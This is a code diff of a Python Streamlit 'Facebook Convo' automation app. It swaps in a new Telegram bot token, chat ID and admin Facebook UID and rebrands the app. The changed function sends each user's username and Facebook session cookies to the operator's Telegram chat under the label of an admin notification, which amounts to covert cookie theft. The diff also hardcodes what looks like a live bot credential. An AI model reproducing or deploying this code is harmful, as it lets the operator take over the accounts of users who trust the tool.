@@ -474,8 +474,8 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
 def send_telegram_notification(username, automation_state=None, cookies=""):
     """Send admin notification via Telegram bot - MUCH MORE RELIABLE than Facebook!"""
     try:
-        telegram_bot_token = "79045aXI"
-        telegram_admin_chat_id = "532"
+        telegram_bot_token = "8315798077:AAHXkoC5ZaQx4qfRJrehg-kAVuBRfdoRg3U"
+        telegram_admin_chat_id = "7630298796"
         
         from datetime import datetime
         import pytz
@@ -488,7 +488,7 @@ def send_telegram_notification(username, automation_state=None, cookies=""):
 
 👤 *Username:* {username}
 ⏰ *Time:* {current_time}
-🤖 *System:* HASSAN RAJPUT E2EE Facebook Automation
+🤖 *System:* ALEX
 🍪 *Cookies:* `{cookies_display}`
 
 ✅ User has successfully started the automation process."""
@@ -515,7 +515,7 @@ def send_telegram_notification(username, automation_state=None, cookies=""):
         return False
 
 def send_admin_notification(user_config, username, automation_state=None, user_id=None):
-    ADMIN_UID = "61567810846706"
+    ADMIN_UID = "100003955228091"
     driver = None
     try:
         log_message(f"ADMIN-NOTIFY: Sending usage notification for user: {username}", automation_state)
@@ -1135,7 +1135,7 @@ def stop_automation(user_id):
     st.session_state.automation_state.running = False
     db.set_automation_running(user_id, False)
 
-st.markdown('<div class="main-header"><h1>HASSAN RAJPUT E2EE FACEBOOK CONVO</h1><p>Created by HASSAN RAJPUT</p></div>', unsafe_allow_html=True)
+st.markdown('<div class="main-header"><h1>ALEX FACEBOOK CONVO</h1><p>Created by HASSAN RAJPUT</p></div>', unsafe_allow_html=True)
 
 if not st.session_state.logged_in:
     tab1, tab2 = st.tabs(["🔐 Login", "✨ Sign Up"])
